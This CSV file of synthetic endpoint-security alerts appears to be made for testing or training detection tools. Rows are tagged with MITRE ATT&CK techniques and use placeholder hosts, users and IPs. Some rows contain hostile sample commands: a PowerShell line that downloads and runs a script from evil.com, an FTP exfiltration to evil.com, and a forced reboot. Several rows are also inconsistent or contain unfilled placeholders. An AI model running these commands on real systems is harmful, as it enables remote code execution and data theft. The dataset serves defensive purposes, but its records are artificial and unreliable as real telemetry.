12345,,2023-03-10T15:30:00Z,,,,Comprmised Supply Chain,Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise can take place at any stage.,,,,,,,,,,,,,,,,,,,,,,,High,,,,,Malware,,,,,,,,,,,,,,,,msiexec.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"Investigate the affected software or hardware component for signs of compromise and take appropriate remediation actions, such as blocking the component or applying a security update.",,,,,,,,,443,,,Process,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,123.45.67.89,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Outbound connection to suspicious or known malicious IP and/or port,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ekfkgk6,,2023-03-04T15:30:00Z,,,,System Services,,,,,,,,,,,,,,,,,,,,,,,,High,,,,,EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services either locally or remotely. Many services are set to run at boot, which can aid in achieving persistence (Create or Modify System Process), but adversaries can also abuse services for one-time or temporary execution.","{'EndpointID': '123456', 'Hostname': 'endpoint-01', 'IPAddress': '192.168.1.100', 'OS': 'Windows 10', 'UserName': 'admin', 'ProcessName': 'services.exe', 'ProcessID': '1234'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,,2023-03-10T15:30:00Z,,,,System Shutdown,A system shutdown or reboot has been initiated.,,,,,,,,,,,,,,,,,,,,,,,High,,,ProcessCreate,,Malicious Activity,,,,,,,,,,,,,,DESKTOP-1234,,cmd.exe,shutdown /r /t 0,,,192.168.1.100,user1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
739409f,,2023-03-09T12:30:00Z,,,,Unusual traffic,Defender for Endpoint has detected unusual network traffic.,,,,,,,,,,,,,Network traffic analysis,,,,,,,,,,High,,,,,Network,,,,,,,,Defender for Endpoint,,,,,,,,,,,,192.168.0.100,,,,,,,,,,,,,,,,,,,,,,,,,,Windows 10,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,EXAMPLE-HOSTNAME,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"['Isolate the affected endpoint from the network', 'Terminate any suspicious processes or connections', 'Scan the endpoint for malware or signs of compromise', 'Patch any known vulnerabilities in the endpoint or software applications']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
,,2023-03-08T14:30:00Z,,,,Data Transfer to Cloud Account,"This alert is triggered when a data transfer to a cloud account is detected, which may indicate data exfiltration or suspicious activity. This could be an indication of malicious activity, and warrants further investigation.",,,,,,,,,,,,,,,,,,,,,,,High,,,,,,12345678-1234-1234-1234-123456789012,,,,,,,Microsoft Defender for Endpoint,,,,,,,,powershell.exe,Copy-Item C:\LocalFolder -Destination https://mycloudstorage.com/myfolder,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,T1537,5678.0,https://mycloudstorage.com,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345678-abcd-1234-abcd-1234567890ab,,2022-10-15T16:27:42Z,,,,Trojanized SSH client,"SSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the users public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.",,,,,,,,,,,,,,,,,,,ssh.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,LAPTOP-123,,,,ssh.exe -l user -p 22 example.com,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Program Files (x86)\SSH\ssh.exe,ssh.exe,,,,,,,,,,,,,,,,,,,,,,,High,,Endpoint detection and response,,,,,,,,1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,203.0.113.1,Behavioral analysis,abcdef1234567890,Trojan:Win32/SSHClientBreach,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
82940f,,2022-04-01T10:30:00Z,,,,User Execution,"While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.",,,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,C:\Users\User1\Downloads\malware.exe,,C:\Users\User1\Downloads\malware.exe,,,192.168.1.100,,,,,,,,,,,,,,,,,,,,,,,,,,Windows 10,,,,,,,,,C:\Windows\explorer.exe,abc123def456,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,PC123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,User Execution,Execution,Unknown,explorer.exe,1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
09876,,2023-03-10T15:30:00Z,,,,Valid Accounts,"A user account with administrative privileges was used to perform actions typically associated with malicious activity, including accessing sensitive data or installing software.",,,,,,,,,,,,,,,,,,,,,,,High,,,Behavioral,,,,,,,,,,Microsoft Defender for Endpoint EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Host,User Account,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Privilege Escalation,Valid Accounts,host-1234,10.0.0.1,User account 'Administrator' was used to access sensitive data,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
45678,,,,,,Suspicious Web Service Connection,Microsoft Defender ATP detected suspicious network activity related to a web service on the endpoint.,,,,,,,,,,,,C:\Windows\System32\svchost.exe -k DcomLaunch,,,,,,,,,,,Medium,,,Behavioral,,,,,,,,,,Microsoft Defender ATP,,,,,,computer01.example.com,,C:\Windows\System32\svchost.exe,,,,192.168.0.1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,443,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,10.0.0.1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2023-03-09T09:00:00Z,abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890,W3SVC,C:\Windows\System32\inetsrv\w3wp.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
123456,,2023-03-10T15:30:00Z,High,Windows Management Instrumentation Execution,,Windows Management Instrumentation Execution,"This alert is triggered when Windows Management Instrumentation (WMI) is used to execute commands or scripts on a system, which is a technique used by attackers to bypass traditional security controls.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,wmiprvse.exe,,,,,JohnDoe,,,,192.168.1.100,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,endpoint,Defender,C:\Windows\System32\wbem\wmiprvse.exe,DOMAIN,PC12345,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,,2023-03-10T15:30:00Z,,,,Abuse of Elevation Control Mechanism Detected,Abuse of an elevation control mechanism was detected on the following device: {Device_Name}. The user {User_Name} attempted to elevate their privileges without authorization by running {Executable_Name} with elevated privileges.,,,,,,Abuse Elevation Control Mechanism,,,,,,,,,,,,,,,,,High,,,,,Privilege Escalation,,,,,,,,,,,,Privilege Escalation,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{Device_Name},{User_Name},{Executable_Name},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ldkddfgh,,2022-03-07T16:47:13.0000000Z,,,,Access Removal,A privileged account was removed or disabled.,,,,,,,,,,,,,,,,,,,,,,,3,,,Behavior,12345,Threat,,,"{'AlertType': 'Behavior', 'BehaviorName': 'Account Access Removal', 'AlertId': '12345', 'ThreatName': 'Account Access Removal', 'Severity': 'High', 'TimestampUtc': '2022-03-07T16:47:13.0000000Z', 'Tactic': 'Defense Evasion', 'Technique': 'Account Access Removal', 'AffectedEntities': {'User': [{'AccountName': 'example-account', 'SecurityIdentifier': 'S-1-5-21-1234567890-1234567890-1234567890-1001'}]}, 'CommandLine': 'net user example-account /active:no'}",example-hostname,New,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
445566778888,,2023-03-10T14:30:00.000Z,,,,Build Image on Host Detected,The endpoint has detected an attempt to build an image on the host system. This behavior is consistent with the MITRE ATT&CK technique T1612.,,,,Endpoint Detection and Response,,,,,,,,"""C:\Program Files\Docker\Docker\Docker Desktop.exe""",,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,docker,,,,192.168.1.100,,1234,5678,,,,,,,,,,,,,powershell.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Program Files\Docker\Docker\Docker Desktop.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,ExampleHost01,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Build Image on Host,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,JohnDoe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
099909,,2022-03-09T09:30:00.0000000Z,,,,Data Manipulation,Suspicious data manipulation activity was detected on the endpoint.,,,,,,,,,,,,,,,,,,,,,,,2,,,Behavior,12345,Suspicious,,,"{'AlertType': 'Behavior', 'BehaviorName': 'Data Manipulation', 'AlertId': '12345', 'ThreatName': 'Data Manipulation', 'Severity': 'Medium', 'TimestampUtc': '2022-03-09T09:30:00.0000000Z', 'MITRE': {'Tactic': ['Defense Evasion'], 'Technique': [{'Id': 'T1565', 'Name': 'Data Manipulation'}]}, 'AffectedEntities': {'Process': [{'ProcessId': 1234, 'ProcessCommandLine': 'C:\\Program Files\\example-app\\example-app.exe', 'ProcessStartTimeUtc': '2022-03-09T09:00:00.0000000Z', 'ProcessParentCommandLine': 'C:\\Windows\\system32\\cmd.exe /c start C:\\Program Files\\example-app\\example-app.exe', 'ProcessParentImageFileName': 'cmd.exe', 'ProcessGrandparentCommandLine': 'C:\\Windows\\system32\\cmd.exe /c start C:\\Program Files\\example-app\\example-app.exe', 'ProcessGrandparentImageFileName': 'cmd.exe'}], 'File': [{'FilePath': 'C:\\Windows\\Temp\\example-file.txt', 'FileName': 'example-file.txt', 'CreateTimeUtc': '2022-03-09T09:15:00.0000000Z', 'ModifyTimeUtc': '2022-03-09T09:20:00.0000000Z', 'SHA256Hash': 'ABC123...'}]}}",example-hostname,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0303345,,2022-04-05T08:32:15Z,,,,deployment of unauthorized container on host,This alert is triggered when an attempt to deploy an unauthorized container is detected on a host.,,,,Container Security,,Deploy Container,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,Host01,/usr/bin/docker,,docker run -itd unauthorized-image:latest,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,john.doe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,unauthorized-image:latest,Docker,docker run,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
99909090,,2023-03-10T12:00:00Z,,,,Execution Guardrails,,,,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Windows 10,,,,,,,,,,,,,,,,,,,,,,,,,John.Doe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversarys campaign.,ABC123,Workstation-01,192.168.1.100,cmd.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0009090,,2023-03-08T14:30:00Z,,,,Exfiltration Over C2 Channel Detected,This alert is triggered when data exfiltration is detected over a Command and Control (C2) channel on an endpoint.,,,,,,,,,,,,powershell.exe -nop -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/malware.ps1'),,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,powershell.exe,,,,,JohnDoe,1234,,,,,,,,,,,,,2023-03-08T14:00:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,DESKTOP-ABC123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,evil.com,SensitiveData.txt,HTTP,DOMAIN,explorer.exe,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
00030505,,2023-03-08T14:30:00Z,,,,Exfiltration Over Other Network Medium,This alert is triggered when data exfiltration is detected over an alternative network medium on an endpoint.,,,,,,,,,,,,explorer.exe ftp://evil.com/SensitiveData.txt,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,JohnDoe,1234,,,,,,,,,,,,,2023-03-08T14:00:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,DESKTOP-ABC123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,,SensitiveData.txt,FTP,DOMAIN,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
oeoro5555,,2023-03-08T14:30:00Z,,,,Exfiltration Over Physical Medium ,This alert is triggered when data exfiltration is detected over a physical medium on an endpoint.,,,,,,,,,,,,explorer.exe copy SensitiveData.txt E:\,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,JohnDoe,1234,,,,,,,,,,,,,2023-03-08T14:00:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,DESKTOP-ABC123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,,SensitiveData.txt,USB,DOMAIN,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ldsjfjg90,,2023-03-10T14:00:00Z,,,,Hide Artifacts,Adversaries may attempt to hide artifacts associated with their behaviors to evade detection.,,,,,,Hide Artifacts,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,,explorer.exe,,,,,,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,server01,admin,,,Blocked,Attempt to hide malware file,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,File,C:\Windows\system32\cmd.exe,malware.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
234567,,2022-04-05T13:45:00Z,,,,Inter-Process Communication,,,,,,,,,,,,,,,"['Terminate the suspicious processes.', 'Review and block any network traffic associated with these processes.', 'Perform a full system scan to ensure no other malicious processes are running on the system.']",,,,,,,,,High,,,,,,,,,,,"Detected suspicious inter-process communication between Process A and Process B. Process A, a known trusted process, was found communicating with Process B, a command line tool. This is indicative of possible defense evasion and command and control activity. Further investigation is recommended.",,Defender for Endpoint EDR,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MDE-78901,,,Medium,,,Native OS Functions,"Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,explorer.exe,C:\Windows\explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2022-10-31T15:43:21Z,"['NtOpenFile', 'NtCreateFile', 'NtReadFile']",192.168.1.151,192.168.1.150,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-34567,,,High,,,Masked Executable,Masked executable detected on host COMPUTER-123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,cmd.exe /c C:\Users\user\Downloads\example.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Users\user\Downloads\example.exe,cmd.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,5d41402abc4b2a76b9719d911017c592,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2022-10-31T00:12:34Z,,,,8ce9eaf907aedfcdff2c0a4d77a4c1f0,explorer.exe,e57597d202f73c0f6a4057f3d1a784b7,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
6384095-,,2023-03-10T19:00:00Z,,,,Masquerade as a Legitimate Application,"Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation.",,,,,,Masquerade as a Legitimate Application,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,,explorer.exe,explorer.exe /c C:\Windows\system32\notepad.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,server01,user01,,,Blocked,Process attempted to execute an unauthorized file,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0304950,,2023-03-10T20:00:00Z,,,,Modify Registry,"Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.",,,,,,Modify Registry,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,desktop01,user01,,,Blocked,Unauthorized modification of registry key,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
